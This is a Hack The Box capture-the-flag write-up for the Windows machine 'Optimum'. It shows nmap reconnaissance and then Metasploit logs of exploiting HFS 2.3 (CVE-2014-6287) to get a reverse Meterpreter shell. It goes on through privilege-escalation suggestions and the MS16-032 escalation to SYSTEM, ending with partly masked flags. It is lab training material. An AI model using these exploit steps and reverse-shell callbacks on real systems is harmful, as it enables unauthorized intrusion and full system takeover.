---
title: Optimum
date: 2025-11-29 10:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, optimum ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bb09ffeaffe2f5220a1d591bb7b4f95e.png
    alt: Hack The Box
---

> Optimum
Windows · Easy 

## Task 1
Which version of HttpFileServer is running on TCP port 80?


``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sC -sV -sS  10.129.5.57 -T 5 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 22:43 CET
Nmap scan report for 10.129.5.57
Host is up (0.040s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.79 seconds
                                                                                                                                      

```

> 2.3

## Task 2
What is the 2014 CVE ID for a remote code execution vulnerability in the findMacroMarker function in HttpFileServer 2.3 version?

> CVE-2014-6287

## Task 3

What user is the webserver running as? Provide the username without the domain.

``` shell
msf exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on 10.10.15.224:4444 
[*] Using URL: http://10.10.15.224:8080/fl9IFmC
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /fl9IFmC
[*] Sending stage (188998 bytes) to 10.129.5.57
[!] Tried to delete %TEMP%\zgubx.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.15.224:4444 -> 10.129.5.57:49162) at 2025-12-06 22:53:21 +0100
[*] Server stopped.

meterpreter > getuid
Server username: OPTIMUM\kostas
```

> kostas

## Task 4


``` shell
meterpreter > migrate 2080
[*] Migrating from 1384 to 2080...
[*] Migration completed successfully.
```

Migro el proceso para tener un meterpreter mas estable



``` shell
c:\Users\kostas\Desktop>type user.txt
type user.txt
db20f5580d9d13b8************
```

## Task 5

Optional question: What is the password for the kostas user?

Esta pregunta es opcional. 

## Task 6

Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?

``` shell
[*] 10.129.5.57 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!                                              
 8   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 8.1/Windows Server 2012 R2 build detected!                                                         
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

El módulo suggester sugiere estos exploits para escalar privilegios, ya es un viejo conocido para resolver máquinas.

> local_exploit_suggester


## Submit Root Flag

``` shell

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
[*] Started reverse TCP handler on 10.10.15.224:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\fCEMvLra.ps1...
[*] Compressing script contents...
[+] Compressed size: 3757
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1224

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $cU8k = [Ntdll]::NtImpersonateThread($sb_zP, $sb_zP, [ref]$pmn)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (pmn:VariablePath) [], RuntimeException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateToken" to type "System.IntPtr": "Cannot co
nvert null to type "System.IntPtr"."
At line:259 char:2
+     $cU8k = [Advapi32]::DuplicateToken($yW_, 2, [ref]$xKwV)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

Vbo6fsmXLnqcqSYjvB6MwQeQij63Fkya
[+] Executed on target machine.
[*] Sending stage (188998 bytes) to 10.129.5.57
[*] Meterpreter session 2 opened (10.10.15.224:4444 -> 10.129.5.57:49163) at 2025-12-06 23:08:20 +0100
[+] Deleted C:\Users\kostas\AppData\Local\Temp\fCEMvLra.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
b9c49869d00fdd83************

``` 

> b9c49869d00fdd83f************

